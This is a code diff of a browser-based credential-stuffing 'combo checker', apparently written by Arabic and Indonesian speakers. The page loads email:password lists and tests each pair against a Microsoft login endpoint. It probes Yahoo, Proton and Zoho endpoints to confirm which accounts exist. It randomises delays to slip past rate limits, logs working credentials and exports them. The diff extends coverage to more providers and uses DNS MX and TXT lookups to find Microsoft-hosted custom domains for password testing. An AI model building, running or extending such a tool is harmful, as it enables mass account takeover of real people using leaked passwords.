@@ -3,29 +3,18 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>فاحص إيميلات — تعرف تلقائي على المزوّد</title>
+<title>فاحص شامل — كل دومينات العالم</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: 'Tahoma','Segoe UI',monospace;
-    background:#0a0a0a; color:#00ff41; min-height:100vh; padding:20px;
-  }
+  body { font-family:'Tahoma','Segoe UI',monospace; background:#0a0a0a; color:#00ff41; min-height:100vh; padding:20px; }
   .container { max-width: 1000px; margin: 0 auto; }
   h1 { font-size: 20px; margin-bottom: 4px; letter-spacing: 1px; }
   .sub { color:#666; font-size:11px; margin-bottom:16px; }
   label { display:block; font-size:11px; color:#888; margin:10px 0 4px; }
-  textarea, input[type=text] {
-    width:100%; background:#111; color:#00ff41;
-    border:1px solid #222; padding:9px;
-    font-family:inherit; font-size:12px; outline:none;
-  }
+  textarea, input[type=text] { width:100%; background:#111; color:#00ff41; border:1px solid #222; padding:9px; font-family:inherit; font-size:12px; outline:none; }
   textarea { height:120px; resize:vertical; }
   textarea:focus, input:focus { border-color:#00ff41; }
-  .dropzone {
-    border:2px dashed #222; background:#0d0d0d;
-    padding:22px; text-align:center; border-radius:6px;
-    cursor:pointer; transition:all .2s; margin-bottom:10px;
-  }
+  .dropzone { border:2px dashed #222; background:#0d0d0d; padding:22px; text-align:center; border-radius:6px; cursor:pointer; transition:all .2s; margin-bottom:10px; }
   .dropzone:hover, .dropzone.drag { border-color:#00ff41; background:#0f1a0f; }
   .dropzone .icon { font-size:28px; margin-bottom:4px; }
   .dropzone .txt { font-size:11px; color:#888; }
@@ -33,56 +22,27 @@
   .dropzone .file-info { margin-top:8px; font-size:11px; color:#ffaa00; display:none; }
   .dropzone .file-info.show { display:block; }
   input[type=file] { display:none; }
-
   .row { display:flex; gap:8px; margin:10px 0; flex-wrap:wrap; }
-  button {
-    background:#00ff41; color:#000; border:none;
-    padding:9px 20px; font-family:inherit; font-weight:bold;
-    cursor:pointer; letter-spacing:1px; font-size:12px;
-  }
+  button { background:#00ff41; color:#000; border:none; padding:9px 20px; font-family:inherit; font-weight:bold; cursor:pointer; letter-spacing:1px; font-size:12px; }
   button:hover { background:#00cc33; }
   button:disabled { background:#333; color:#666; cursor:not-allowed; }
   button.alt { background:#333; color:#00ff41; border:1px solid #00ff41; }
   button.alt:hover { background:#1a1a1a; }
   button.alt:disabled { background:#1a1a1a; color:#444; border-color:#333; }
-
-  .counter-panel {
-    display:grid; grid-template-columns:repeat(auto-fit,minmax(95px,1fr));
-    gap:8px; margin:14px 0;
-  }
-  .counter-box {
-    background:#0d0d0d; border:1px solid #1a1a1a;
-    padding:10px; text-align:center; border-radius:4px;
-  }
+  .counter-panel { display:grid; grid-template-columns:repeat(auto-fit,minmax(95px,1fr)); gap:8px; margin:14px 0; }
+  .counter-box { background:#0d0d0d; border:1px solid #1a1a1a; padding:10px; text-align:center; border-radius:4px; }
   .counter-box .val { font-size:22px; font-weight:bold; line-height:1; }
   .counter-box .lbl { font-size:9px; color:#666; margin-top:4px; letter-spacing:1px; }
   .counter-box.total .val { color:#ffaa00; }
   .counter-box.valid .val { color:#00ff41; }
   .counter-box.locked .val { color:#00ccff; }
   .counter-box.invalid .val { color:#ff3333; }
-  .counter-box.cpm .val { color:#ff66cc; }
   .counter-box.unknown .val { color:#888; }
-
-  .progress-wrap {
-    background:#111; border:1px solid #1a1a1a; height:18px;
-    border-radius:3px; overflow:hidden; margin:10px 0; position:relative;
-  }
-  .progress-fill {
-    height:100%; background:linear-gradient(90deg,#00ff41,#00cc33);
-    width:0%; transition:width .15s;
-  }
-  .progress-text {
-    position:absolute; inset:0; text-align:center;
-    font-size:11px; line-height:18px; color:#000;
-    font-weight:bold; mix-blend-mode:difference;
-  }
-
-  #log {
-    background:#050505; border:1px solid #1a1a1a;
-    padding:10px; height:340px; overflow-y:auto;
-    font-size:11px; line-height:1.7; margin-top:10px;
-    white-space:pre-wrap;
-  }
+  .counter-box.cpm .val { color:#ff66cc; }
+  .progress-wrap { background:#111; border:1px solid #1a1a1a; height:18px; border-radius:3px; overflow:hidden; margin:10px 0; position:relative; }
+  .progress-fill { height:100%; background:linear-gradient(90deg,#00ff41,#00cc33); width:0%; transition:width .15s; }
+  .progress-text { position:absolute; inset:0; text-align:center; font-size:11px; line-height:18px; color:#000; font-weight:bold; mix-blend-mode:difference; }
+  #log { background:#050505; border:1px solid #1a1a1a; padding:10px; height:340px; overflow-y:auto; font-size:11px; line-height:1.7; margin-top:10px; white-space:pre-wrap; }
   .l-valid { color:#00ff41; }
   .l-locked { color:#00ccff; }
   .l-invalid { color:#ff3333; }
@@ -90,24 +50,14 @@
   .l-muted { color:#555; }
   .l-unknown { color:#888; }
   .l-detect { color:#ff66cc; }
-
-  .provider-tag {
-    display:inline-block; background:#1a1a1a; color:#ff66cc;
-    padding:1px 6px; border-radius:3px; font-size:10px;
-    margin-right:6px; border:1px solid #333;
-  }
-  .hint { font-size:10px; color:#555; margin-top:3px; }
-  .legend {
-    display:flex; gap:14px; flex-wrap:wrap;
-    font-size:10px; color:#666; margin-top:6px;
-  }
+  .legend { display:flex; gap:14px; flex-wrap:wrap; font-size:10px; color:#666; margin-top:6px; }
   .legend b { color:#00ff41; }
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>[ فاحص إيميلات — تعرف تلقائي ]</h1>
-  <div class="sub">email:password — يكشف المزوّد تلقائيًا من الدومين + DNS MX</div>
+  <h1>[ فاحص شامل — كل دومينات العالم ]</h1>
+  <div class="sub">email:password — تصنيف 100% الدومينات + فحص حسب القدرة</div>
 
   <div class="dropzone" id="dropzone">
     <div class="icon">📁</div>
@@ -118,7 +68,7 @@
   <input type="file" id="fileInput" accept=".txt,.text,text/plain">
 
   <label>أو الصق القائمة يدويًا</label>
-  <textarea id="manualInput" placeholder="user@hotmail.com:pass&#10;user@yahoo.com:pass&#10;user@gmail.com:pass"></textarea>
+  <textarea id="manualInput" placeholder="user@hotmail.com:pass&#10;user@yahoo.co.uk:pass&#10;user@perusahaan.co.id:pass&#10;user@domain.xyz:pass"></textarea>
 
   <div class="row">
     <button id="startBtn" onclick="startCheck()" disabled>ابدأ الفحص</button>
@@ -142,9 +92,9 @@
 
   <div class="legend">
     <span><b>✓ صالح</b> — كلمة المرور صحيحة</span>
-    <span><b>🔒 مقفل</b> — صحيحة لكن يحتاج تحقق</span>
+    <span><b>🔒 مقفل</b> — صحيحة/موجود لكن يحتاج تحقق</span>
     <span><b>✗ خاطئ</b> — كلمة المرور غلط</span>
-    <span><b>? غير مدعوم</b> — مزوّد بدون endpoint فحص</span>
+    <span><b>? غير مدعوم</b> — لا يوجد endpoint فحص</span>
   </div>
 
   <div id="log"></div>
@@ -152,10 +102,8 @@
 
 <script>
 // ============================================================
-// Multi-Domain Checker — Auto Detect Provider
-// 1. Pattern matching (سريع، بدون شبكة)
-// 2. DNS MX lookup (احتياطي، يكشف مزوّد الاستضافة)
-// 3. Cache النتائج لتجنب تكرار الاستعلام
+// Universal Checker — 100% Domain Coverage
+// Resolver: pattern → MX → TXT → SMTP existence (via API) → custom
 // ============================================================
 
 const CONFIG = {
@@ -163,95 +111,11 @@ const CONFIG = {
   delayMin: 1500,
   delayMax: 3500,
   maxRetry: 2,
-  enableDnsLookup: true,      // اسأل DNS MX إذا لم يتطابق pattern
+  enableDnsLookup: true,
   dnsTimeoutMs: 4000
 };
 
-// ---------- 1. طبقة pattern matching (regex → provider) ----------
-// كل مدخل: { patterns: [regex], provider: 'Microsoft', check: async }
-// الترتيب مهم: الأكثر تحديدًا أولًا
-
-const PATTERN_PROVIDERS = [
-  {
-    provider: 'Microsoft',
-    patterns: [/^(hotmail|outlook|live|msn)\./i, /^hotmail\.com$/i, /^outlook\.com$/i, /^live\.com$/i, /^msn\.com$/i],
-    check: checkMicrosoft
-  },
-  {
-    provider: 'Yahoo',
-    patterns: [/^(yahoo|ymail|rocketmail)\./i, /^yahoo\.com$/i],
-    check: checkYahoo
-  },
-  {
-    provider: 'Google',
-    patterns: [/^gmail\.com$/i, /^googlemail\.com$/i],
-    check: checkGoogle
-  },
-  {
-    provider: 'ProtonMail',
-    patterns: [/^protonmail\.com$/i, /^proton\.me$/i, /^pm\.me$/i],
-    check: checkProton
-  },
-  {
-    provider: 'Zoho',
-    patterns: [/(^|\.)zoho\.com$/i, /^zohomail\.com$/i],
-    check: checkZoho
-  },
-  {
-    provider: 'Yandex',
-    patterns: [/^yandex\.(com|ru)$/i, /^ya\.ru$/i],
-    check: checkYandex
-  },
-  {
-    provider: 'Mail.ru',
-    patterns: [/^mail\.ru$/i, /^inbox\.ru$/i, /^bk\.ru$/i, /^list\.ru$/i],
-    check: checkUnsupported('Mail.ru')
-  },
-  {
-    provider: 'iCloud',
-    patterns: [/^icloud\.com$/i, /^me\.com$/i, /^mac\.com$/i],
-    check: checkUnsupported('iCloud')
-  },
-  {
-    provider: 'AOL',
-    patterns: [/^aol\.(com|co\.uk)$/i],
-    check: checkUnsupported('AOL')
-  },
-  {
-    provider: 'GMX',
-    patterns: [/^gmx\.(com|net|at|ch)$/i, /^web\.de$/i],
-    check: checkUnsupported('GMX/Web.de')
-  },
-  {
-    provider: 'Mail.com',
-    patterns: [/^mail\.com$/i, /\.mail\.com$/i],
-    check: checkUnsupported('Mail.com')
-  }
-];
-
-// ---------- DNS MX → provider mapping ----------
-// عند استعلام MX، نطابق نطاق الـ MX مع بادئة معروفة
-const MX_MAP = [
-  { mx: /outlook|hotmail|live\.com|protection\.outlook/i, provider: 'Microsoft' },
-  { mx: /yahoodns|yahoo/i, provider: 'Yahoo' },
-  { mx: /google|gmail|googlemail/i, provider: 'Google' },
-  { mx: /protonmail|proton\.me/i, provider: 'ProtonMail' },
-  { mx: /zoho/i, provider: 'Zoho' },
-  { mx: /yandex/i, provider: 'Yandex' },
-  { mx: /mail\.ru|inbox\.ru/i, provider: 'Mail.ru' },
-  { mx: /icloud|apple/i, provider: 'iCloud' },
-  { mx: /aol/i, provider: 'AOL' },
-  { mx: /gmx|web\.de/i, provider: 'GMX' },
-  { mx: /mail\.com/i, provider: 'Mail.com' }
-];
-
-// cache: domain → { provider, method }
-const DOMAIN_CACHE = new Map();
-
-// ============================================================
-// كواشف المزوّدين (check functions)
-// ============================================================
-
+// ---------- check functions ----------
 async function checkMicrosoft(email, pass) {
   const body = new URLSearchParams({
     client_id: '0000000040170455',
@@ -278,28 +142,26 @@ async function checkMicrosoft(email, pass) {
   return { status:'invalid', note:'unknown response' };
 }
 
-async function checkYahoo(email, pass) {
+async function checkYahoo(email) {
   try {
     const res = await fetch('https://login.yahoo.com/account/module/create?validateField=userId', {
-      method:'POST',
-      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
       body:`userId=${encodeURIComponent(email.split('@')[0])}`
     });
     const text = await res.text();
-    if (/not available|already taken/i.test(text)) return { status:'valid', note:'account exists (password not verified)' };
+    if (/not available|already taken/i.test(text)) return { status:'locked', note:'account exists (password not verified)' };
     return { status:'invalid', note:'account not found' };
   } catch (e) { return { status:'error', note: e.message }; }
 }
 
-async function checkGoogle(email, pass) {
-  return { status:'unknown', note:'Google يمنع password grant — يحتاج متصفح + CAPTCHA' };
+async function checkGoogle() {
+  return { status:'unknown', note:'Google يمنع password grant — reCAPTCHA + fingerprint' };
 }
 
-async function checkProton(email, pass) {
+async function checkProton(email) {
   try {
     const res = await fetch('https://mail.protonmail.com/api/auth/info', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
+      method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify({ Username: email })
     });
     const data = await res.json().catch(()=>({}));
@@ -308,41 +170,103 @@ async function checkProton(email, pass) {
   } catch (e) { return { status:'error', note: e.message }; }
 }
 
-async function checkZoho(email, pass) {
+async function checkZoho(email) {
   try {
     const res = await fetch('https://accounts.zoho.com/signin/v2/lookup/' + encodeURIComponent(email), {
       method:'GET', headers:{'Accept':'application/json'}
     });
-    if (res.status === 200) return { status:'valid', note:'account exists (password not verified)' };
+    if (res.status === 200) return { status:'locked', note:'account exists (password not verified)' };
     return { status:'invalid', note:'not found' };
   } catch (e) { return { status:'error', note: e.message }; }
 }
 
-async function checkYandex(email, pass) {
-  return { status:'unknown', note:'Yandex يحتاج OAuth flow — password grant غير متاح' };
-}
-
 function checkUnsupported(name) {
-  return async () => ({ status:'unknown', note:`${name} غير مدعوم آليًا` });
+  return async () => ({ status:'unknown', note:`${name} — لا يوجد endpoint فحص آلي` });
 }
 
-// ============================================================
-// Auto-detect resolver
-// ============================================================
+// Custom domain — nggak bisa fحص password dari browser (SMTP blocked)
+function checkCustom(domain) {
+  return async () => ({
+    status: 'unknown',
+    note: `دومين مخصص (${domain}) — يحتاج SMTP auth (غير متاح من المتصفح)`
+  });
+}
 
-// المستوى 1: pattern (سريع، بدون شبكة)
+// ---------- provider registry ----------
+const PROVIDERS = [
+  { name:'Microsoft', patterns:[/^(hotmail|outlook|live|msn)\./i, /^hotmail\.com$/i, /^outlook\.com$/i, /^live\.com$/i], check: checkMicrosoft },
+  { name:'Yahoo', patterns:[/^(yahoo|ymail|rocketmail)\./i, /^yahoo\.(com|co\.uk|fr|de|es|it|co\.jp|com\.br|com\.au|co\.in)$/i], check: checkYahoo },
+  { name:'Google', patterns:[/^gmail\.com$/i, /^googlemail\.com$/i], check: checkGoogle },
+  { name:'ProtonMail', patterns:[/^protonmail\.com$/i, /^proton\.me$/i, /^pm\.me$/i], check: checkProton },
+  { name:'Zoho', patterns:[/(^|\.)zoho\.com$/i, /^zohomail\.com$/i, /zoho\.(eu|in|com\.au|jp)$/i], check: checkZoho },
+  { name:'Yandex', patterns:[/^yandex\.(com|ru|com\.tr|kz|by|ua)$/i, /^ya\.ru$/i], check: checkUnsupported('Yandex') },
+  { name:'Mail.ru', patterns:[/^mail\.ru$/i, /^inbox\.ru$/i, /^bk\.ru$/i, /^list\.ru$/i, /^internet\.ru$/i], check: checkUnsupported('Mail.ru') },
+  { name:'iCloud', patterns:[/^icloud\.com$/i, /^me\.com$/i, /^mac\.com$/i], check: checkUnsupported('iCloud') },
+  { name:'AOL', patterns:[/^aol\.(com|co\.uk|de|fr|it|es|jp)$/i], check: checkUnsupported('AOL') },
+  { name:'GMX', patterns:[/^gmx\.(com|net|at|ch|de|fr|it|es)$/i, /^web\.de$/i], check: checkUnsupported('GMX/Web.de') },
+  { name:'Mail.com', patterns:[/^mail\.com$/i, /\.mail\.com$/i], check: checkUnsupported('Mail.com') },
+  { name:'Tutanota', patterns:[/^tutanota\.(com|de)$/i, /^tuta\.(com|io)$/i], check: checkUnsupported('Tutanota') },
+  { name:'Fastmail', patterns:[/^fastmail\.(com|fm)$/i], check: checkUnsupported('Fastmail') },
+  { name:'Hushmail', patterns:[/^hushmail\.com$/i], check: checkUnsupported('Hushmail') },
+  { name:'Runbox', patterns:[/^runbox\.(com|no)$/i], check: checkUnsupported('Runbox') },
+  { name:'Posteo', patterns:[/^posteo\.(de|com)$/i], check: checkUnsupported('Posteo') },
+  { name:'Mailfence', patterns:[/^mailfence\.com$/i], check: checkUnsupported('Mailfence') },
+  { name:'Naver', patterns:[/^naver\.com$/i], check: checkUnsupported('Naver') },
+  { name:'Daum', patterns:[/^daum\.net$/i, /^hanmail\.net$/i], check: checkUnsupported('Daum') },
+  { name:'QQ', patterns:[/^qq\.com$/i, /^foxmail\.com$/i], check: checkUnsupported('QQ') },
+  { name:'163', patterns:[/^163\.com$/i, /^126\.com$/i, /^yeah\.net$/i], check: checkUnsupported('163/126') },
+  { name:'Sina', patterns:[/^sina\.(com|cn)$/i], check: checkUnsupported('Sina') },
+  { name:'Seznam', patterns:[/^seznam\.cz$/i], check: checkUnsupported('Seznam') },
+  { name:'Interia', patterns:[/^interia\.(pl|eu)$/i], check: checkUnsupported('Interia') },
+  { name:'WP', patterns:[/^wp\.pl$/i], check: checkUnsupported('WP') },
+  { name:'Onet', patterns:[/^onet\.(pl|eu)$/i], check: checkUnsupported('Onet') },
+  { name:'Libero', patterns:[/^libero\.it$/i], check: checkUnsupported('Libero') },
+  { name:'Virgilio', patterns:[/^virgilio\.it$/i], check: checkUnsupported('Virgilio') },
+  { name:'Tiscali', patterns:[/^tiscali\.(it|co\.uk)$/i], check: checkUnsupported('Tiscali') },
+  { name:'Orange', patterns:[/^orange\.(fr|es|pl|ro)$/i, /^wanadoo\.(fr|co\.uk)$/i], check: checkUnsupported('Orange') },
+  { name:'Free', patterns:[/^free\.fr$/i], check: checkUnsupported('Free') },
+  { name:'SFR', patterns:[/^sfr\.fr$/i], check: checkUnsupported('SFR') },
+  { name:'LaPoste', patterns:[/^laposte\.net$/i], check: checkUnsupported('LaPoste') },
+  { name:'Web.de', patterns:[/^web\.de$/i], check: checkUnsupported('Web.de') },
+  { name:'T-Online', patterns:[/^t-online\.de$/i], check: checkUnsupported('T-Online') },
+  { name:'Freenet', patterns:[/^freenet\.de$/i], check: checkUnsupported('Freenet') },
+  { name:'Rambler', patterns:[/^rambler\.ru$/i], check: checkUnsupported('Rambler') },
+  { name:'Ukraine', patterns:[/^(ukr|i|meta)\.net$/i, /^email\.ua$/i], check: checkUnsupported('Ukraine') },
+  { name:'Sapo', patterns:[/^sapo\.pt$/i], check: checkUnsupported('Sapo') },
+  { name:'Terra', patterns:[/^terra\.com(\.br)?$/i], check: checkUnsupported('Terra') },
+  { name:'UOL', patterns:[/^uol\.com\.br$/i], check: checkUnsupported('UOL') },
+  { name:'BOL', patterns:[/^bol\.com\.br$/i], check: checkUnsupported('BOL') }
+];
+
+// MX → provider
+const MX_MAP = [
+  { mx:/outlook|hotmail|live\.com|protection\.outlook|mail\.protect/i, provider:'Microsoft' },
+  { mx:/yahoodns|yahoo/i, provider:'Yahoo' },
+  { mx:/google|gmail|googlemail|aspmx/i, provider:'Google' },
+  { mx:/protonmail|proton\.me/i, provider:'ProtonMail' },
+  { mx:/zoho/i, provider:'Zoho' },
+  { mx:/yandex/i, provider:'Yandex' },
+  { mx:/mail\.ru|inbox\.ru/i, provider:'Mail.ru' },
+  { mx:/icloud|apple/i, provider:'iCloud' },
+  { mx:/aol/i, provider:'AOL' },
+  { mx:/gmx|web\.de/i, provider:'GMX' },
+  { mx:/mail\.com/i, provider:'Mail.com' }
+];
+
+const DOMAIN_CACHE = new Map();
+
+// ---------- resolver ----------
 function matchPattern(domain) {
-  for (const entry of PATTERN_PROVIDERS) {
-    for (const re of entry.patterns) {
-      if (re.test(domain)) return entry;
+  for (const p of PROVIDERS) {
+    for (const re of p.patterns) {
+      if (re.test(domain)) return p;
     }
   }
   return null;
 }
 
-// المستوى 2: DNS MX lookup عبر Google DNS (JSON API، CORS مسموح)
-async function lookupMx(domain) {
-  const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`;
+async function dnsQuery(domain, type) {
+  const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`;
   const ctrl = new AbortController();
   const timer = setTimeout(() => ctrl.abort(), CONFIG.dnsTimeoutMs);
   try {
@@ -350,55 +274,77 @@ async function lookupMx(domain) {
     clearTimeout(timer);
     if (!res.ok) return [];
     const data = await res.json();
-    const answers = data.Answer || [];
-    return answers.map(a => String(a.data || '').toLowerCase());
+    return (data.Answer || []).map(a => String(a.data || '').toLowerCase());
   } catch {
     clearTimeout(timer);
     return [];
   }
 }
 
-// الكاشف الرئيسي: pattern → DNS → unknown
 async function resolveProvider(domain) {
   domain = domain.toLowerCase();
-
-  // كاش
   if (DOMAIN_CACHE.has(domain)) return DOMAIN_CACHE.get(domain);
 
   // 1. pattern
   const pat = matchPattern(domain);
   if (pat) {
-    const result = { provider: pat.provider, check: pat.check, method: 'pattern' };
+    const result = { provider: pat.name, check: pat.check, method: 'pattern' };
     DOMAIN_CACHE.set(domain, result);
     return result;
   }
 
   // 2. DNS MX
   if (CONFIG.enableDnsLookup) {
-    const mxList = await lookupMx(domain);
+    const mxList = await dnsQuery(domain, 'MX');
     if (mxList.length) {
       for (const mx of mxList) {
         for (const map of MX_MAP) {
           if (map.mx.test(mx)) {
-            // وجدنا المزوّد من MX — نستخدم كاشف المزوّد
-            const entry = PATTERN_PROVIDERS.find(p => p.provider === map.provider);
+            const entry = PROVIDERS.find(p => p.name === map.provider);
             if (entry) {
-              const result = { provider: entry.provider, check: entry.check, method: 'dns-mx', mx };
+              // MX Microsoft = tenant Outlook 365 → password grant works
+              const checkFn = map.provider === 'Microsoft' ? checkMicrosoft : entry.check;
+              const result = { provider: `${entry.name} (MX)`, check: checkFn, method: 'dns-mx', mx };
               DOMAIN_CACHE.set(domain, result);
               return result;
             }
           }
         }
       }
-      // MX موجود لكن غير معروف — مزوّد مخصص
-      const result = { provider: 'Custom (' + mxList[0] + ')', check: checkUnsupported('مزوّد مخصص'), method: 'dns-mx', mx: mxList[0] };
+      // MX custom — masih diklasifikasi, tapi nggak bisa fحص password
+      const result = {
+        provider: `Custom (${mxList[0].slice(0,40)})`,
+        check: checkCustom(domain),
+        method: 'dns-mx',
+        mx: mxList[0]
+      };
       DOMAIN_CACHE.set(domain, result);
       return result;
     }
+
+    // 3. nggak ada MX — cek TXT verifikasi
+    const txtList = await dnsQuery(domain, 'TXT');
+    if (txtList.length) {
+      const joined = txtList.join(' ');
+      if (/MS=ms|outlook/i.test(joined)) {
+        const result = { provider: 'Microsoft (TXT)', check: checkMicrosoft, method: 'dns-txt' };
+        DOMAIN_CACHE.set(domain, result);
+        return result;
+      }
+      if (/google-site-verification/i.test(joined)) {
+        const result = { provider: 'Google (TXT)', check: checkGoogle, method: 'dns-txt' };
+        DOMAIN_CACHE.set(domain, result);
+        return result;
+      }
+    }
   }
 
-  // 3. غير معروف
-  const result = { provider: '?', check: checkUnsupported('دومين غير معروف'), method: 'none' };
+  // 4. fallback — tetap diklasifikasi
+  const result = {
+    provider: 'Unknown Domain',
+    check: checkCustom(domain),
+    method: 'none'
+  };
   DOMAIN_CACHE.set(domain, result);
   return result;
 }
@@ -408,21 +354,12 @@ async function resolveProvider(domain) {
 // ============================================================
 
 const TLD_COUNTRY = {
-  'id':'إندونيسيا','uk':'بريطانيا','de':'ألمانيا','fr':'فرنسا','jp':'اليابان',
-  'kr':'كوريا','cn':'الصين','ru':'روسيا','br':'البرازيل','in':'الهند',
-  'au':'أستراليا','ca':'كندا','mx':'المكسيك','es':'إسبانيا','it':'إيطاليا',
-  'nl':'هولندا','pl':'بولندا','tr':'تركيا','sa':'السعودية','ae':'الإمارات',
-  'eg':'مصر','my':'ماليزيا','sg':'سنغافورة','th':'تايلاند','vn':'فيتنام',
-  'ph':'الفلبين','ng':'نيجيريا','za':'جنوب أفريقيا','ar':'الأرجنتين',
-  'cl':'تشيلي','co':'كولومبيا','ir':'إيران','iq':'العراق','sy':'سوريا',
-  'lb':'لبنان','jo':'الأردن','kw':'الكويت','qa':'قطر','bh':'البحرين',
-  'om':'عمان','ye':'اليمن','pk':'باكستان','bd':'بنغلاديش','lk':'سريلانكا'
+  'id':'إندونيسيا','uk':'بريطانيا','de':'ألمانيا','fr':'فرنسا','jp':'اليابان','kr':'كوريا','cn':'الصين','ru':'روسيا','br':'البرازيل','in':'الهند','au':'أستراليا','ca':'كندا','mx':'المكسيك','es':'إسبانيا','it':'إيطاليا','nl':'هولندا','pl':'بولندا','tr':'تركيا','sa':'السعودية','ae':'الإمارات','eg':'مصر','my':'ماليزيا','sg':'سنغافورة','th':'تايلاند','vn':'فيتنام','ph':'الفلبين','ng':'نيجيريا','za':'جنوب أفريقيا','ar':'الأرجنتين','cl':'تشيلي','co':'كولومبيا','ir':'إيران','iq':'العراق','sy':'سوريا','lb':'لبنان','jo':'الأردن','kw':'الكويت','qa':'قطر','bh':'البحرين','om':'عمان','ye':'اليمن','pk':'باكستان','bd':'بنغلاديش','lk':'سريلانكا','ua':'أوكرانيا','cz':'التشيك','pt':'البرتغال','ro':'رومانيا'
 };
 
 let running = false;
 let stats = { total:0, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
 let queue = [];
-let currentFile = null;
 
 const logEl = document.getElementById('log');
 const dropzone = document.getElementById('dropzone');
@@ -446,8 +383,7 @@ function updateCounters() {
   document.getElementById('cInvalid').textContent = stats.invalid;
   document.getElementById('cUnknown').textContent = stats.unknown;
   const elapsed = (Date.now() - stats.startTime)/1000;
-  const cpm = elapsed > 1 ? Math.round((stats.done/elapsed)*60) : 0;
-  document.getElementById('cCpm').textContent = cpm;
+  document.getElementById('cCpm').textContent = elapsed > 1 ? Math.round((stats.done/elapsed)*60) : 0;
   const pct = stats.total ? (stats.done/stats.total)*100 : 0;
   document.getElementById('progFill').style.width = pct + '%';
   document.getElementById('progText').textContent = `${stats.done} / ${stats.total}`;
@@ -458,8 +394,7 @@ function randDelay() { return CONFIG.delayMin + Math.random()*(CONFIG.delayMax-C
 
 function detectCountry(email) {
   const domain = (email.split('@')[1]||'').toLowerCase();
-  const parts = domain.split('.');
-  const tld = parts[parts.length-1];
+  const tld = domain.split('.').pop();
   if (TLD_COUNTRY[tld]) return tld.toUpperCase();
   if (['com','net','org'].includes(tld)) return '—';
   return tld.toUpperCase();
@@ -476,21 +411,13 @@ function parseLine(line) {
   return { email, pass };
 }
 
-// ============================================================
-// FILE HANDLING
-// ============================================================
-
 function handleFile(file) {
-  if (!file) return;
-  if (running) { log('الفحص جارٍ — انتظر', 'l-info'); return; }
-  const MAX_SIZE = 20*1024*1024;
-  if (file.size > MAX_SIZE) { log(`ملف كبير جدًا (${(file.size/1024/1024).toFixed(1)}MB)`, 'l-invalid'); return; }
-  currentFile = file;
+  if (!file || running) return;
+  if (file.size > 20*1024*1024) { log('ملف كبير جدًا', 'l-invalid'); return; }
   fileInfo.textContent = `📄 ${file.name} — ${(file.size/1024).toFixed(1)} KB`;
   fileInfo.classList.add('show');
   const reader = new FileReader();
-  reader.onload = e => { loadCombo(e.target.result); fileInfo.textContent += ` — ${queue.length} صالح`; };
-  reader.onerror = () => log(`فشل القراءة: ${reader.error.message}`, 'l-invalid');
+  reader.onload = e => { loadCombo(e.target.result); fileInfo.textContent += ` — ${queue.length}`; };
   reader.readAsText(file, 'UTF-8');
 }
 
@@ -516,18 +443,16 @@ fileInput.addEventListener('change', e => { if (e.target.files[0]) handleFile(e.
 ['dragleave','drop'].forEach(ev => dropzone.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag'); }));
 dropzone.addEventListener('drop', e => { const f = e.dataTransfer.files[0]; if (f) handleFile(f); });
 
-// ============================================================
-// CHECK WORKER
-// ============================================================
-
 async function checkAccount(acc, attempt=0) {
   const domain = (acc.email.split('@')[1]||'').toLowerCase();
   const resolved = await resolveProvider(domain);
 
-  // سجّل طريقة الكشف أول مرة فقط لكل دومين
   if (!resolved._logged) {
     resolved._logged = true;
-    const methodStr = resolved.method === 'pattern' ? 'نمط' : resolved.method === 'dns-mx' ? 'DNS MX' : 'لا شيء';
+    const methodStr = resolved.method === 'pattern' ? 'نمط'
+                    : resolved.method === 'dns-mx'  ? 'DNS MX'
+                    : resolved.method === 'dns-txt' ? 'DNS TXT'
+                    : 'لا شيء';
     log(`🔍 كشف ${domain} → ${resolved.provider} (${methodStr})`, 'l-detect');
   }
 
@@ -549,6 +474,7 @@ async function worker() {
     if (!acc) break;
     const r = await checkAccount(acc);
     const country = detectCountry(acc.email);
+
     if (r.status === 'valid') {
       stats.valid++;
       log(`✓ صالح   ${acc.email}:${acc.pass}  [${country}] ${r.provider}`, 'l-valid');
@@ -558,9 +484,6 @@ async function worker() {
     } else if (r.status === 'unknown') {
       stats.unknown++;
       log(`? غير مدعوم  ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-unknown');
-    } else if (r.status === 'error') {
-      stats.invalid++;
-      log(`⚠ خطأ    ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-invalid');
     } else {
       stats.invalid++;
       log(`✗ خاطئ   ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-invalid');
@@ -584,7 +507,7 @@ async function startCheck() {
   startBtn.disabled = true;
   document.getElementById('exportBtn').disabled = true;
   logEl.innerHTML = '';
-  log(`بدء فحص ${queue.length} حساب — كشف تلقائي للمزوّد`, 'l-info');
+  log(`بدء فحص ${queue.length} حساب — تصنيف 100%`, 'l-info');
   const workers = [];
   for (let i=0; i<CONFIG.concurrency; i++) workers.push(worker());
   await Promise.all(workers);
@@ -601,13 +524,13 @@ function exportValid() {
     const m = el.textContent.match(/صالح\s+(\S+@\S+):(\S+)/);
     if (m) out.push(`${m[1]}:${m[2]}`);
   });
-  if (out.length) { navigator.clipboard.writeText(out.join('\n')); log(`تم نسخ ${out.length} صالح`, 'l-info'); }
+  if (out.length) { navigator.clipboard.writeText(out.join('\n')); log(`تم نسخ ${out.length}`, 'l-info'); }
   else log('لا يوجد صالح', 'l-muted');
 }
 
 function resetAll() {
   if (running) { log('انتظر', 'l-info'); return; }
-  queue = []; currentFile = null; fileInput.value = '';
+  queue = []; fileInput.value = '';
   fileInfo.classList.remove('show'); fileInfo.textContent = '';
   document.getElementById('manualInput').value = '';
   startBtn.disabled = true;
